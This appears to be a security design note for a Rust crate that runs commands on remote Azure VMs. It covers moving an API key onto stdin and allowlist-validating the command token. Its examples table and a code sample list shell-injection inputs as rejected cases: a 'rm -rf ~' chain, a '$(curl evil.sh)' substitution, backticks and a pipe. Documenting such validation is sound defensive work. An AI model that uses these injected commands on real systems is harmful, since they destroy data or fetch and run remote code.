# Executor Secret Transport & Command Validation Hardening

> [Home](../index.md) > [Security](./README.md) > Executor Secret & Command Hardening

> Status: Implemented · Severity: P1 (security hardening) · Crate: `amplihack-remote`
> Resolves: [#997](https://github.com/rysweet/amplihack-rs/issues/997)

## Summary

`amplihack-remote`'s executor runs amplihack commands on remote Azure VMs by
invoking the `azlin` SSH wrapper with a generated shell script. Two hardening
measures close concrete leakage and injection vectors in that path:

- **F1 — API key never on argv or disk.** `ANTHROPIC_API_KEY` (and related
  secrets) are transported to the remote command exclusively through the child
  process's **piped stdin**, read on the remote with `IFS= read -r`. The key
  appears in **neither the local argv, nor the remote argv, nor any temp script
  on disk, nor any log line**. The previous behavior — base64-embedding the key
  into the generated script body (which lands in argv / process listing) — has
  been removed. Base64 was obfuscation, not protection.

- **F2 — Command token validated before execution.** The `command` token
  (`auto`, `ultrathink`, `analyze`, `fix`, …) is validated against a strict
  allowlist **before** any script is built or any process is spawned. Anything
  containing shell metacharacters, whitespace, command substitution, or that is
  empty is rejected up front, making the `--{command}` interpolation
  injection-safe.

Both measures **fail closed** and surface errors explicitly via `RemoteError`.
There are no silent fallbacks or degraded paths, consistent with the crate's
error-handling policy.

## Threat model

| ID | Threat | CWE | Before | After |
| --- | --- | --- | --- | --- |
| F1 | Secret disclosure via process listing / argv / temp script | CWE-214, CWE-532 | `ANTHROPIC_API_KEY` base64-embedded in script → visible in `ps`/argv | Key sent over child stdin only; never in argv, disk, or logs |
| F2 | Command injection / RCE via raw shell interpolation | CWE-78 | `command` interpolated raw into shell string | Allowlist-validated before spawn; metacharacters rejected |

The `prompt` remains **untrusted input**: it is base64-encoded and consumed only
as a shell variable (`"$PROMPT"`), never as executable code. The `azlin`/SSH
trust boundary continues to provide transport authentication.

## F1 — Secret transport via stdin

### How it works

1. The executor builds a **key-free** remote script. The first meaningful line
   reads the secret from stdin and exports it into the remote environment:

   ```sh
   IFS= read -r ANTHROPIC_API_KEY
   export ANTHROPIC_API_KEY
   ```

   The literal key value is **never** present in the script body.

2. The executor spawns `azlin connect …` with **`Stdio::piped()`** stdin,
   writes `api_key + "\n"` to the child's stdin, **flushes**, and **drops the
   stdin handle immediately** so the remote `read` sees EOF and execution
   proceeds. This replaces the current transport, which embeds
   `export ANTHROPIC_API_KEY=$(echo '<base64>' | base64 -d)` directly in the
   generated script body (visible in argv / `ps` on both hosts).

3. SSH forwards the local child's stdin to the remote command, so the key is
   delivered into the remote process's environment without ever touching argv or
   disk on either side.

> **stdin ownership change.** `execute_remote_with_api_key` currently sets
> `Stdio::null()` and `execute_remote_tmux` inherits the parent's stdin. Both
> switch to `Stdio::piped()`. Because the idle-watchdog path
> (`wait_with_idle_watchdog`) and the tmux path already take/await the child, the
> key is written and the handle dropped **before** the wait begins; the tmux path
> moves from `Command::output()` to spawn → write stdin → wait so it can feed the
> key.

> **Transport assumption.** Correctness relies on `azlin connect` passing the
> local child's stdin through to the remote command's stdin (standard SSH
> behavior for a non-interactive command). The remote `IFS= read -r` consumes
> exactly one line — the key — before any user prompt is processed.

### Regression guard (issue #867)

The interactive-orchestrator TTY protection from #867 is preserved by
construction. #867 used `Stdio::null()` to stop the child from stealing the
orchestrator's terminal; the hardened path instead hands the child a
**one-shot pipe** — written once, flushed, and its handle dropped — never a live
terminal. The child still cannot read the orchestrator's interactive TTY, and it
receives exactly one line (the key) followed by EOF.

### Error handling

- Writing or flushing the key to child stdin failing → propagated as
  `RemoteError::execution(...)`. The remote failure is surfaced, never swallowed.
- An empty or whitespace-only key is rejected **before** spawn via
  `RemoteError::validation(...)` (fail closed). This intentionally standardizes
  the previously `RemoteError::execution`-typed empty-key check onto the same
  `validation` variant used by command validation, so every pre-spawn rejection
  is reported uniformly. The message is corrected from the misleading
  "not found in environment" to an explicit empty-key message (a
  present-but-empty key is not a missing-env-var condition). The genuinely
  missing-variable lookup in `execute_remote` keeps its `RemoteError::execution`
  "not found in environment" message, since that path really is a missing env var.
- The key and the full script body are **never logged**. Existing
  `info!(command, …)` log lines are unchanged and log only the (validated)
  command token, never the secret.

### Applies to

- `Executor::execute_remote_with_api_key` (idle-watchdog path)
- `Executor::execute_remote_tmux` (detached tmux launch)
- `Executor::execute_remote` inherits the transport transitively — it reads
  `ANTHROPIC_API_KEY` from the environment and delegates to
  `execute_remote_with_api_key`.

All three public method signatures are unchanged (patch-level SemVer).

## F2 — Command validation

### Allowlist rule

The `command` token must match:

```text
^[a-z][a-z0-9-]{0,31}$
```

- Lowercase ASCII letter first, then up to 31 more lowercase letters, digits, or
  hyphens (32 chars total).
- Covers every current command mode (`auto`, `ultrathink`, `analyze`, `fix`) and
  leaves room for future hyphenated modes.
- Rejects **all** shell metacharacters, whitespace, command substitution
  (`$(...)`, backticks), pipes, redirects, semicolons, and the empty string.

Validation is a hand-rolled check (no `regex` dependency) run at the executor
boundary, before any script build or process spawn, in:

- `Executor::execute_remote`
- `Executor::execute_remote_with_api_key`
- `Executor::execute_remote_tmux`

### Rejection behavior

Invalid input fails closed with an explicit error:

```text
RemoteError::validation("invalid command: <token>")
```

No escaping, no sanitizing-and-continuing — invalid commands are rejected, not
transformed.

### Examples

| Input | Result |
| --- | --- |
| `auto` | ✅ accepted |
| `ultrathink` | ✅ accepted |
| `analyze` | ✅ accepted |
| `fix` | ✅ accepted |
| `analyze; rm -rf ~` | ❌ rejected (metacharacters) |
| `$(curl evil.sh)` | ❌ rejected (substitution) |
| `` `id` `` | ❌ rejected (backticks) |
| `auto fix` | ❌ rejected (whitespace) |
| `auto\|cat` | ❌ rejected (pipe) |
| `` (empty) | ❌ rejected (empty) |
| `Auto` | ❌ rejected (uppercase) |

## Usage

No API changes are required by callers. The hardening is transparent to existing
call sites:

```rust
use amplihack_remote::executor::Executor;

let executor = Executor::new(vm, timeout_minutes, tunnel_port);

// `command` is validated against the allowlist before anything is spawned.
// `api_key` is delivered to the remote over stdin — never on argv or disk.
let result = executor
    .execute_remote_with_api_key(
        "auto",        // validated command token
        prompt,        // untrusted; base64-encoded, consumed as "$PROMPT"
        max_turns,
        &api_key,      // transported via child stdin only
    )
    .await?;
```

A malicious command is rejected before any process runs:

```rust
// Returns Err(RemoteError::validation("invalid command: analyze; rm -rf ~"))
let err = executor
    .execute_remote_with_api_key("analyze; rm -rf ~", prompt, max_turns, &api_key)
    .await
    .unwrap_err();
```

## Configuration

No new configuration, environment variables, or dependencies are introduced.
Existing timeout and idle-watchdog behavior is unchanged; **no new fixed
resource caps** were added.

## Security invariants

- The API key value never appears in: local argv, remote argv, on-disk temp
  script, `tracing` output, or `RemoteError` messages.
- The generated remote script contains `IFS= read -r ANTHROPIC_API_KEY` and does
  **not** contain the key literal or a `base64 -d` of the key.
- Every execution path validates `command` against the allowlist before spawn.
- All failures (invalid command, empty key, stdin write failure) surface
  explicitly as `RemoteError`; no path silently degrades.

## Test coverage

Inline `#[cfg(test)] mod tests` in `crates/amplihack-remote/src/executor.rs`
proves the invariants:

- **Allowlist matrix** — every valid mode is accepted; the injection/whitespace/
  empty/uppercase cases above are rejected with `RemoteError::validation`.
- **Key-free script builders** — the built script/argv contains no `api_key`
  substring and no `base64 -d` of the key, and does contain
  `IFS= read -r ANTHROPIC_API_KEY`.
- **Fail-closed key** — an empty or whitespace-only key errors before spawn.

Run the crate's suite and lint gates:

```bash
cargo test -p amplihack-remote
cargo clippy --all-targets -- -D warnings
pre-commit run --all-files
```
